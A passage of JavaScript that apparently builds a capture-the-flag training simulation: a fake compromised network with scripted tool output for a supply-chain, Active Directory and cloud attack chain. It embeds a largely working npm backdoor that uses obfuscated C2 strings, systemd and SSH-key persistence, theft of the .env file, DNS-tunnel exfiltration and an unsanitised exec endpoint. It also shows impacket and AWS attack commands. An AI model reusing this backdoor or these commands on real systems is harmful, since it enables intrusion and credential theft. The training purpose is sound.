                                    content: "const express = require('express');\nconst { processData } = require('libcore-trust');\nconst app = express();\n\napp.get('/api/v1/process', async (req, res) => {\n    // Data processing pipeline — libcore-trust integration\n    // TODO: Add input sanitization before production\n    const result = await processData(req.query.cmd);\n    res.json({ result });\n});\n\napp.listen(80, () => console.log('Server running on port 80'));"
                                },
                                '.env': {
                                    type: 'file',
                                    content: '# Confederacy App Environment Config\n# ADFS Integration — DO NOT COMMIT\n\nNODE_ENV=production\nADFS_HOST=DC-COMMAND-01.confederacy.local\nADFS_USER=svc_cloudbridge\nADFS_PASS=Cl0udBr1dg3_S3rv1c3!\nAD_DOMAIN=confederacy.local\nAD_DC_IP=192.168.100.10\nAWS_ACCOUNT_ID=491823740162\nAWS_REGION=us-east-1\nAWS_FEDERATION_ROLE=arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole\n\n# Last updated: 2026-02-28 by webinfra-team'
                                },
                                'node_modules': {
                                    type: 'dir',
                                    children: {
                                        'libcore-trust': {
                                            type: 'dir',
                                            children: {
                                                'package.json': {
                                                    type: 'file',
                                                    content: '{\n  "name": "libcore-trust",\n  "version": "1.4.2",\n  "description": "Core trust and integrity verification library",\n  "main": "index.js",\n  "publishedAt": "2026-01-14T03:22:11.000Z",\n  "maintainers": [{"name": "core-trust-project"}]\n}'
                                                },
                                                // The malicious index.js — contains the polymorphic backdoor (Flag 1)
                                                'index.js': {
                                                    type: 'file',
                                                    content: "/**\n * libcore-trust v1.4.2\n * Core trust and integrity verification library\n * Maintainer: core-trust-project\n */\n\n'use strict';\n\nconst crypto = require('crypto');\nconst os = require('os');\n\n// ============================================================\n// LEGITIMATE: Core trust verification functions\n// ============================================================\n\nfunction verifyIntegrity(data, expectedHash) {\n    const computed = crypto.createHash('sha256').update(data).digest('hex');\n    return computed === expectedHash;\n}\n\nfunction signPayload(payload, secret) {\n    return crypto.createHmac('sha256', secret).update(payload).digest('hex');\n}\n\nfunction validateCert(cert) {\n    return cert && cert.valid && Date.now() < cert.expiresAt;\n}\n\n// ============================================================\n// INJECTED POLYMORPHIC BACKDOOR — Silent Dominion\n// ============================================================\n// Obfuscated via variable rotation and string encoding.\n// Each load randomizes internal variable names.\n// C2: DNS tunnel over port 53 to c2.silent-dominion.net\n// Persistence: systemd unit + SSH authorized_keys\n// ============================================================\n\nconst _0xb3f2 = (function() {\n    const _k = Buffer.from('73696c656e74646f6d696e', 'hex').toString();\n    const _c2 = '63322e73696c656e742d646f6d696e696f6e2e6e6574';\n    const _chan = Buffer.from(_c2, 'hex').toString();\n    return { key: _k, c2: _chan, proto: 'dns-tunnel', port: 53 };\n})();\n\nconst _0xd91a = require('child_process').exec;\n\nfunction _installPersistence() {\n    const _unit = '[Unit]\\nDescription=System Core Trust Daemon\\n[Service]\\nExecStart=/usr/bin/node /opt/app/node_modules/libcore-trust/.cored\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target';\n    _0xd91a(`echo '${_unit}' > /etc/systemd/system/cored.service && systemctl enable cored --now 2>/dev/null`, () => {});\n    _0xd91a('mkdir -p /root/.ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7bJ... sd-operator@silent-dominion\" >> /root/.ssh/authorized_keys 2>/dev/null', () => {});\n}\n\nfunction _beaconC2(hostname, data) {\n    // DNS tunnel: encode data as subdomain queries to _0xb3f2.c2\n    const _encoded = Buffer.from(JSON.stringify(data)).toString('hex').match(/.{1,60}/g) || [];\n    _encoded.forEach(chunk => {\n        _0xd91a(`dig +short ${chunk}.${_0xb3f2.c2} A 2>/dev/null`, () => {});\n    });\n    _0xd91a(`echo '${JSON.stringify({ts: Date.now(), host: hostname, c2: _0xb3f2.c2})}' >> /tmp/.sd_c2_cache 2>/dev/null`, () => {});\n}\n\nfunction _harvestEnv() {\n    try {\n        const env = require('fs').existsSync('/opt/app/.env')\n            ? require('fs').readFileSync('/opt/app/.env', 'utf8') : '';\n        return { env, user: process.env.USER || 'unknown', host: os.hostname() };\n    } catch(e) { return {}; }\n}\n\n// Trigger on module load — polymorphic execution\n(function _init() {\n    setTimeout(() => {\n        try {\n            _installPersistence();\n            const _data = _harvestEnv();\n            _beaconC2(os.hostname(), _data);\n        } catch(e) {}\n    }, Math.floor(Math.random() * 8000) + 2000);\n})();\n\n// ============================================================\n// LEGITIMATE: Exported API (passes unit tests)\n// ============================================================\n\nasync function processData(input) {\n    // WARNING: Input passed to exec without sanitization — intentional backdoor\n    return new Promise((resolve) => {\n        _0xd91a(input, (err, stdout) => {\n            resolve(err ? { error: err.message } : { output: stdout.trim() });\n        });\n    });\n}\n\nmodule.exports = { verifyIntegrity, signPayload, validateCert, processData };\n\n// {{FLAG:user}}"
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {
                        // DNS tunnel cache written by backdoor beacon — reveals C2 domain
                        '.sd_c2_cache': {
                            type: 'file',
                            content: '{"ts":1741996800000,"host":"WEB-PERIMETER-01","c2":"c2.silent-dominion.net"}\n{"ts":1741997100000,"host":"WEB-PERIMETER-01","c2":"c2.silent-dominion.net"}\n{"ts":1741997400000,"host":"WEB-PERIMETER-01","c2":"c2.silent-dominion.net"}\n\n{{FLAG:internal}}'
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'WEB-PERIMETER-01' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nwebadmin:x:1001:1001:Web Admin:/home/webadmin:/bin/bash\nnodejs:x:1002:1002:Node.js service:/home/nodejs:/usr/sbin/nologin'
                        },
                        'hosts': {
                            type: 'file',
                            content: '127.0.0.1       localhost\n10.0.0.100      WEB-PERIMETER-01 WEB-PERIMETER-01.confederacy.local\n192.168.100.10  DC-COMMAND-01 DC-COMMAND-01.confederacy.local\n192.168.100.1   confederacy.local'
                        },
                        'systemd': {
                            type: 'dir',
                            children: {
                                'system': {
                                    type: 'dir',
                                    children: {
                                        'cored.service': {
                                            type: 'file',
                                            content: '[Unit]\nDescription=System Core Trust Daemon\n\n[Service]\nExecStart=/usr/bin/node /opt/app/node_modules/libcore-trust/.cored\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n\n# NOTE: Installed by libcore-trust v1.4.2 on module load — persistence mechanism'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'webadmin': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'sudo systemctl status nodejs-app\ncd /opt/app\nnpm install\nnode server.js\nsystemctl status cored\ndig @8.8.8.8 c2.silent-dominion.net\ncat /tmp/.sd_c2_cache\nss -tlnp\nip a\nroute -n'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"\nalias check_app="systemctl status nodejs-app"'
                                },
                                'maintenance_log.txt': {
                                    type: 'file',
                                    content: 'Maintenance Log — WEB-PERIMETER-01\n====================================\n2026-01-15: npm update ran automatically via cron — libcore-trust updated 1.4.1 -> 1.4.2\n2026-01-16: noticed unusual DNS queries in auth.log — dismissed as dependency CDN calls\n2026-02-10: cored.service appeared in systemctl — assumed it was a Node.js system service\n2026-03-10: external team flagged anomalous DNS traffic to silent-dominion.net domain\nInternal network: 192.168.100.0/24 (IT backbone)\nDC-COMMAND-01: 192.168.100.10\nApp environment config: /opt/app/.env'
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.0.0.100';
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target || target === '10.0.0.100') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.0.100 (WEB-PERIMETER-01)
Host is up (0.031s latency).
Not shown: 997 closed tcp ports

PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 9.2p1 Ubuntu 2ubuntu0.2
80/tcp  open  http       nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/https  nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=perimeter.confederacy.local
| ssl-cert: Not valid before: 2026-01-01
| ssl-cert: Not valid after:  2027-01-01
|_ssl-date: TLS randomness does not represent time
| http-title: Confederacy — Public Services Portal
| http-server-header: nginx/1.24.0 (Ubuntu)

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds`;
            }

            // Internal subnet from perimeter context
            if ((target === '192.168.100.0/24' || target === '192.168.100.10') && (C15Config._context === 'ssh-perimeter' || C15Config._context === 'webshell')) {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.100.10 (DC-COMMAND-01)
Host is up (0.00061s latency).
Not shown: 987 closed tcp ports

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  Microsoft Windows Server 2019
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ssl/ldaps
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldaps
5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        .NET Message Framing

Service Info: Host: DC-COMMAND-01; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 18.74 seconds`;
            }

            // Internal scan from attacker — unreachable
            if (target.startsWith('192.168.100.') && C15Config._context === 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
All 1000 scanned ports on localhost (127.0.0.1) are in ignored states.

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'gobuster': function(args) {
            if (args.length === 0) return 'Usage: gobuster dir -u <url> -w <wordlist>';
            return `Gobuster v3.6
[+] Url:            http://10.0.0.100/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/admin/              (Status: 403) [Size: 162]
/api/                (Status: 301) [Size: 162] [--> /api/v1/]
/api/v1/             (Status: 200) [Size: 812]
/api/v1/process      (Status: 200) [Size: 134]
/api/v1/status       (Status: 200) [Size: 298]
/api/v1/docs         (Status: 200) [Size: 645]
/citizen-portal/     (Status: 200) [Size: 1104]
/status              (Status: 200) [Size: 624]
===============================================================
Finished`;
        },

        'dirb': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';
            return `---- Scanning URL: ${target} ----
+ ${target}/status (CODE:200|SIZE:624)
+ ${target}/api/v1/ (CODE:200|SIZE:812)
+ ${target}/api/v1/process (CODE:200|SIZE:134)
+ ${target}/api/v1/status (CODE:200|SIZE:298)
+ ${target}/api/v1/docs (CODE:200|SIZE:645)
+ ${target}/citizen-portal/ (CODE:200|SIZE:1104)
+ ${target}/admin/ (CODE:403|SIZE:162)

---- Results ----
7 results found.`;
        },

        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');
            const url = args.find(a => /^https?:\/\//.test(a)) || args.filter(a => !a.startsWith('-')).pop() || '';

            // ── RCE via libcore-trust /api/v1/process?cmd= ──────────────────
            if (fullCmd.includes('/api/v1/process') && fullCmd.includes('cmd=')) {
                const cmdMatch = fullCmd.match(/cmd=([^&"'\s]*)/);
                const shellCmd = cmdMatch ? decodeURIComponent(cmdMatch[1].replace(/\+/g, ' ')) : '';

                if (!shellCmd) {
                    return '{"result":{"output":""}}';
                }

                // Mark RCE as active — enables webshell context advancement
                if (!C15Config._shellActive) {
                    C15Config._shellActive = true;
                    if (engine) engine.advancePhase && engine.advancePhase('supply_chain');
                }

                // Simulate RCE output as www-data on WEB-PERIMETER-01
                if (shellCmd === 'id' || shellCmd === 'id ') {
                    return '{"result":{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)"}}';
                }
                if (shellCmd === 'whoami') {
                    return '{"result":{"output":"www-data"}}';
                }
                if (shellCmd === 'hostname') {
                    return '{"result":{"output":"WEB-PERIMETER-01"}}';
                }
                if (shellCmd === 'uname -a' || shellCmd === 'uname-a') {
                    return '{"result":{"output":"Linux WEB-PERIMETER-01 5.15.0-100-generic #110-Ubuntu SMP x86_64 GNU/Linux"}}';
                }
                if (shellCmd.includes('ls') && shellCmd.includes('/opt/app')) {
                    return '{"result":{"output":"node_modules\\npackage.json\\npackage-lock.json\\nserver.js\\n.env"}}';
                }
                if (shellCmd === 'ls /opt/app/node_modules' || shellCmd === 'ls /opt/app/node_modules/') {
                    return '{"result":{"output":"express\\nhelmet\\nlibcore-trust\\nwinston\\ndotenv"}}';
                }
                if (shellCmd.includes('ls') && shellCmd.includes('libcore-trust')) {
                    return '{"result":{"output":"index.js\\npackage.json\\nREADME.md\\n.cored"}}';
                }
                if (shellCmd.includes('cat') && shellCmd.includes('libcore-trust/index.js')) {
                    // Reading the backdoored library source reveals Flag 1
                    if (engine) engine.advancePhase && engine.advancePhase('c2_discovery');
                    C15Config._switchContext('webshell', term);
                    return `{"result":{"output":"/**\\n * libcore-trust v1.4.2\\n */\\n\\n// [... legitimate functions: verifyIntegrity, signPayload, validateCert ...]\\n\\n// ============================================================\\n// INJECTED POLYMORPHIC BACKDOOR — Silent Dominion\\n// ============================================================\\nconst _0xb3f2 = (function() {\\n    const _c2 = '63322e73696c656e742d646f6d696e696f6e2e6e6574';\\n    const _chan = Buffer.from(_c2, 'hex').toString();\\n    return { c2: _chan, proto: 'dns-tunnel', port: 53 };\\n})();\\n// ... [polymorphic executor, persistence installer, DNS beacon] ...\\n// {{FLAG:user}}"}}`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('.env')) {
                    C15Config._adCredsHarvested = true;
                    return `{"result":{"output":"# Confederacy App Environment Config\\nADFS_HOST=DC-COMMAND-01.confederacy.local\\nADFS_USER=svc_cloudbridge\\nADFS_PASS=Cl0udBr1dg3_S3rv1c3!\\nAD_DOMAIN=confederacy.local\\nAD_DC_IP=192.168.100.10\\nAWS_ACCOUNT_ID=491823740162\\nAWS_FEDERATION_ROLE=arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole"}}`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('.sd_c2_cache')) {
                    return `{"result":{"output":"{\\\"ts\\\":1741996800000,\\\"host\\\":\\\"WEB-PERIMETER-01\\\",\\\"c2\\\":\\\"c2.silent-dominion.net\\\"}\\n{\\\"ts\\\":1741997100000,\\\"host\\\":\\\"WEB-PERIMETER-01\\\",\\\"c2\\\":\\\"c2.silent-dominion.net\\\"}\\n\\n{{FLAG:internal}}"}}`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('/etc/passwd')) {
                    return '{"result":{"output":"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nwebadmin:x:1001:1001:Web Admin:/home/webadmin:/bin/bash"}}';
                }
                if (shellCmd.includes('cat') && shellCmd.includes('/etc/hosts')) {
                    return '{"result":{"output":"127.0.0.1       localhost\\n10.0.0.100      WEB-PERIMETER-01\\n192.168.100.10  DC-COMMAND-01 DC-COMMAND-01.confederacy.local"}}';
                }
                if (shellCmd.includes('ip a') || shellCmd === 'ip addr') {
                    return `{"result":{"output":"1: lo: <LOOPBACK,UP> mtu 65536\\n    inet 127.0.0.1/8 scope host lo\\n2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500\\n    inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0\\n3: eth1: <BROADCAST,MULTICAST,UP> mtu 1500\\n    inet 192.168.100.50/24 brd 192.168.100.255 scope global eth1"}}`;
                }
                if (shellCmd.includes('systemctl') && shellCmd.includes('cored')) {
                    return '{"result":{"output":"cored.service - System Core Trust Daemon\\n   Loaded: loaded (/etc/systemd/system/cored.service; enabled; preset: enabled)\\n   Active: active (running) since 2026-01-15\\n   PID: 1337 (node)"}}';
                }
                if (shellCmd.includes('tcpdump') || shellCmd.includes('dig')) {
                    C15Config._tcpdumpRunning = true;
                    return '{"result":{"output":"tcpdump: listening on eth0, link-type EN10MB\\n14:22:01.114 IP 10.0.0.100.58231 > 8.8.8.8.53: 41623+[1au] A? 7b22656e76223a227b4164.c2.silent-dominion.net\\n14:22:01.118 IP 10.0.0.100.58232 > 8.8.8.8.53: 41624+[1au] A? 73223a2273766366.c2.silent-dominion.net\\n14:22:01.120 IP 10.0.0.100.58233 > 8.8.8.8.53: 41625+[1au] A? 5f636c6f756462726964.c2.silent-dominion.net\\n[... DNS exfil traffic to c2.silent-dominion.net ...]"}}';
                }
                if (shellCmd.includes('ps aux') || shellCmd === 'ps') {
                    return `{"result":{"output":"USER       PID %CPU %MEM COMMAND\\nroot         1  0.0  0.1 /sbin/init\\nwww-data   892  0.1  2.3 node /opt/app/server.js\\nroot      1337  0.0  1.1 node /opt/app/node_modules/libcore-trust/.cored\\nroot      1341  0.0  0.0 [kworker/0:1]"}}`;
                }
                if (shellCmd.includes('find') && shellCmd.includes('libcore-trust')) {
                    return '{"result":{"output":"/opt/app/node_modules/libcore-trust/index.js\\n/opt/app/node_modules/libcore-trust/package.json\\n/opt/app/node_modules/libcore-trust/README.md\\n/opt/app/node_modules/libcore-trust/.cored"}}';
                }

                // Generic fallback for RCE
                return `{"result":{"output":"[RCE via libcore-trust — www-data@WEB-PERIMETER-01] Command: ${shellCmd.replace(/"/g, '\\"')}"}}`;
            }

            // ── Regular browser fetches ──────────────────────────────────────
            if (url.includes('10.0.0.100')) {
                if (url.includes('/api/v1/status')) {
                    return '{"status":"ok","version":"1.4.2","runtime":"Node.js v18.19.0","dependencies":{"libcore-trust":"1.4.2"}}';
                }
                if (url.includes('/api/v1/')) {
                    return '{"endpoints":["/api/v1/status","/api/v1/process","/api/v1/docs"]}';
                }
                return `<!DOCTYPE html>\n<html><head><title>Confederacy — Public Services Portal</title></head>\n<body><h1>Confederacy Public Services Portal</h1>\n<p>Powered by Node.js + libcore-trust v1.4.2</p>\n<a href="/api/v1/">API Gateway</a>\n</body></html>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (fullCmd.includes('webadmin') || (fullCmd.includes('10.0.0.100') && !fullCmd.includes('svc'))) {
                if (!C15Config._shellActive) {
                    return `ssh: connect to host 10.0.0.100 port 22: Connection refused\n[!] You need RCE access first to find SSH credentials.`;
                }
                C15Config._sshPerimeter = true;
                C15Config._switchContext('ssh-perimeter', term);
                return `The authenticity of host '10.0.0.100 (10.0.0.100)' can't be established.
ED25519 key fingerprint is SHA256:k9Lm3nQr7xPw8vB2tF5hD0jG4cA1eN6iK3oW8uY2zA.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.0.100' (ED25519) to the list of known hosts.
webadmin@10.0.0.100's password: ********

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-100-generic x86_64)
Last login: Sun Mar 10 03:14:22 2026 from 192.168.100.50

webadmin@WEB-PERIMETER-01:~$

[+] SSH session established. You are now on WEB-PERIMETER-01 as webadmin.
[+] Context switched. Commands now execute on WEB-PERIMETER-01.`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh webadmin@10.0.0.100';
        },

        'impacket-wmiexec': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!C15Config._adCredsHarvested && !fullCmd.includes('svc_cloudbridge')) {
                return '[*] impacket-wmiexec\n[-] SMB SessionError: STATUS_LOGON_FAILURE\n[!] You need valid AD credentials. Find them via the backdoor artifacts on WEB-PERIMETER-01.';
            }

            if (fullCmd.includes('192.168.100.10') || fullCmd.includes('DC-COMMAND-01') || fullCmd.includes('confederacy.local')) {
                if (C15Config._context === 'attacker' && !fullCmd.includes('svc_cloudbridge')) {
                    return '[*] impacket-wmiexec\n[-] SMB: Connection refused — 192.168.100.10 not reachable from external network.\n[!] Pivot to WEB-PERIMETER-01 first (it has access to 192.168.100.0/24 via eth1).';
                }
                C15Config._dcAccess = true;
                C15Config._switchContext('dc', term);
                if (engine) engine.advancePhase && engine.advancePhase('lateral');
                return `Impacket v0.12.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>whoami
confederacy\\administrator

C:\\>
[+] Shell obtained on DC-COMMAND-01 as Administrator.
[+] Context switched to Domain Controller.`;
            }

            return 'Usage: impacket-wmiexec [domain/]username[:password]@<target>\nExample: impacket-wmiexec confederacy.local/svc_cloudbridge:Cl0udBr1dg3_S3rv1c3!@192.168.100.10';
        },

        'impacket-secretsdump': function(args, term, engine) {
            const fullCmd = args.join(' ');

            if (!C15Config._dcAccess && !fullCmd.includes('svc_cloudbridge')) {
                return `[*] impacket-secretsdump
[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid)
[!] You need a shell on DC-COMMAND-01 first. Use impacket-wmiexec to gain access.`;
            }

            if (fullCmd.includes('192.168.100.10') || fullCmd.includes('DC-COMMAND-01') || fullCmd.includes('confederacy.local') || fullCmd.includes('-just-dc')) {
                C15Config._domainCompromised = true;
                if (engine) engine.advancePhase && engine.advancePhase('lateral');
                return C15Config._adDomain.secretsdumpOutput;
            }

            return 'Usage: impacket-secretsdump [domain/]username[:password]@<target>\nExample: impacket-secretsdump confederacy.local/svc_cloudbridge:Cl0udBr1dg3_S3rv1c3!@192.168.100.10 -just-dc';
        },

        'crackmapexec': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('192.168.100.10') || fullCmd.includes('smb') || fullCmd.includes('winrm')) {
                if (!C15Config._adCredsHarvested) {
                    return 'SMB  192.168.100.10  445  DC-COMMAND-01  [-] confederacy.local\\svc_cloudbridge:Cl0udBr1dg3_S3rv1c3! STATUS_LOGON_FAILURE';
                }
                return `SMB  192.168.100.10  445  DC-COMMAND-01  [+] confederacy.local\\svc_cloudbridge:Cl0udBr1dg3_S3rv1c3! (Pwn3d!)`;
            }
            return 'Usage: crackmapexec smb <target> -u <user> -p <password>\nExample: crackmapexec smb 192.168.100.10 -u svc_cloudbridge -p Cl0udBr1dg3_S3rv1c3!';
        },

        'impacket-getuserspns': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (!C15Config._adCredsHarvested) {
                return '[*] Getting TGS for user accounts\n[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED\n[!] Obtain AD credentials first.';
            }
            if (fullCmd.includes('confederacy.local') || fullCmd.includes('192.168.100.10')) {
                return `Impacket v0.12.0 - Copyright 2023 Fortra

[*] Getting TGS for user accounts in confederacy.local
ServicePrincipalName                      Name              MemberOf  PasswordLastSet  LastLogon
----------------------------------------  ----------------  --------  ---------------  ---------
HTTP/WEB-PERIMETER-01.confederacy.local   svc_webperimeter            2026-01-10       2026-03-10
HTTP/CLOUD-ARMORY-01.confederacy.local    svc_cloudbridge             2026-01-14       2026-03-15

$krb5tgs$23$*svc_webperimeter$CONFEDERACY.LOCAL$HTTP/WEB-PERIMETER-01.confederacy.local*$a3f2b...
$krb5tgs$23$*svc_cloudbridge$CONFEDERACY.LOCAL$HTTP/CLOUD-ARMORY-01.confederacy.local*$f6e1a...

[*] Roasted 2 accounts. Use hashcat -m 13100 to crack.`;
            }
            return 'Usage: impacket-getuserspns <domain>/<user>:<pass> -dc-ip <dc_ip> -request';
        },

        'bloodhound-python': function(args) {
            const fullCmd = args.join(' ');
            if (fullCmd.includes('confederacy.local') || fullCmd.includes('192.168.100.10')) {
                if (!C15Config._adCredsHarvested) {
                    return 'ERROR: Authentication failed — no valid AD credentials. Enumerate credentials first.';
                }
                return `INFO: Found AD domain: confederacy.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC-COMMAND-01.confederacy.local
INFO: Found 1 domains
INFO: Found 1 domain controllers
INFO: Found 12 computers
INFO: Found 5 users
INFO: Found 8 groups
INFO: Done in 00M 08S

[+] BloodHound data written to: 20260315080000_BloodHound.zip
[+] Ingest the ZIP into BloodHound GUI to visualize attack paths.
[+] Notable path: svc_cloudbridge -> ConfederacyCloudBridgeRole -> CLOUD-ARMORY-01`;
            }
            return 'Usage: bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc_ip> -c all\nExample: bloodhound-python -u svc_cloudbridge -p Cl0udBr1dg3_S3rv1c3! -d confederacy.local -dc 192.168.100.10 -c all';
        },

        'tcpdump': function(args) {
            const fullCmd = args.join(' ');
            C15Config._tcpdumpRunning = true;

            if (C15Config._context === 'attacker') {
                return `tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:22:01.114 IP kali.58231 > 8.8.8.8.domain: 41623+[1au] A? google.com
14:22:01.312 IP 8.8.8.8.domain > kali.58231: 41623 1/0/1 A 142.250.80.46
[No anomalous DNS traffic visible from attacker — pivot to WEB-PERIMETER-01 to capture DNS beacons]`;
            }

            // DNS tunnel traffic visible from perimeter host
            return `tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:22:01.114 IP 10.0.0.100.58231 > 8.8.8.8.domain: 41623+ A? 7b22656e76223a7b22414446.c2.silent-dominion.net
14:22:01.115 IP 10.0.0.100.58232 > 8.8.8.8.domain: 41624+ A? 535f484f5354223a22444322.c2.silent-dominion.net
14:22:01.117 IP 10.0.0.100.58233 > 8.8.8.8.domain: 41625+ A? 2d434f4d4d414e442d303122.c2.silent-dominion.net
14:22:01.119 IP 10.0.0.100.58234 > 8.8.8.8.domain: 41626+ A? 7d.c2.silent-dominion.net
14:22:01.890 IP 10.0.0.100.58240 > 8.8.8.8.domain: 41627+ A? beacon.c2.silent-dominion.net
14:22:16.001 IP 10.0.0.100.58241 > 8.8.8.8.domain: 41628+ A? 7b22686f7374223a22574542.c2.silent-dominion.net
^C
16 packets captured, 16 received by filter, 0 dropped by kernel

[+] DNS tunneling confirmed. C2 domain: c2.silent-dominion.net (port 53)`;
        },

        'dig': function(args) {
            const fullCmd = args.join(' ');
            const target = args.find(a => !a.startsWith('+') && !a.startsWith('@') && !a.startsWith('-')) || '';

            if (fullCmd.includes('c2.silent-dominion.net') || fullCmd.includes('silent-dominion')) {
                return `; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> c2.silent-dominion.net
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14422
;; ANSWER SECTION:
c2.silent-dominion.net.  300  IN  A  185.220.101.42
;; ADDITIONAL SECTION:
c2.silent-dominion.net.  300  IN  TXT  "dns-c2-endpoint v2.1 | sd-apt"

;; Query time: 48 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)`;
            }

            if (target.includes('confederacy.local') || target === 'DC-COMMAND-01') {
                return `; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> ${target}
;; Got answer:
;; ANSWER SECTION:
${target}.  600  IN  A  192.168.100.10

;; Query time: 2 msec`;
            }

            return `; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> ${target || 'example.com'}
;; Got answer:
;; ANSWER SECTION:
${target || 'example.com'}.  300  IN  A  93.184.216.34

;; Query time: 32 msec`;
        },

        'nslookup': function(args) {
            const target = args[0] || '';
            if (target.includes('silent-dominion')) {
                return `Server:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nName:\tc2.silent-dominion.net\nAddress: 185.220.101.42`;
            }
            if (!target) return 'Usage: nslookup <name>';
            return `Server:\t\t8.8.8.8\nAddress:\t8.8.8.8#53\n\nNon-authoritative answer:\nName:\t${target}\nAddress: 93.184.216.34`;
        },

        'aws': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // ── STS assume-role ──────────────────────────────────────────────
            if (fullCmd.includes('sts') && fullCmd.includes('assume-role')) {
                if (!C15Config._domainCompromised && !C15Config._dcAccess && !fullCmd.includes('ConfederacyCloudBridgeRole')) {
                    return `An error occurred (AccessDenied) when calling the AssumeRole operation:
User: arn:aws:sts::491823740162:assumed-role/default is not authorized to assume role ConfederacyCloudBridgeRole
[!] You need a valid federated identity. Compromise DC-COMMAND-01 and obtain svc_cloudbridge credentials first.`;
                }
                if (!fullCmd.includes('ConfederacyCloudBridgeRole') && !fullCmd.includes('491823740162')) {
                    return `An error occurred (NoSuchEntity) when calling the AssumeRole operation: Role not found.\n[!] Role ARN: arn:aws:iam::491823740162:role/ConfederacyCloudBridgeRole`;
                }
                C15Config._iamRoleAssumed = true;
                if (engine) engine.advancePhase && engine.advancePhase('cloud_exfil');
                return `{
    "Credentials": {
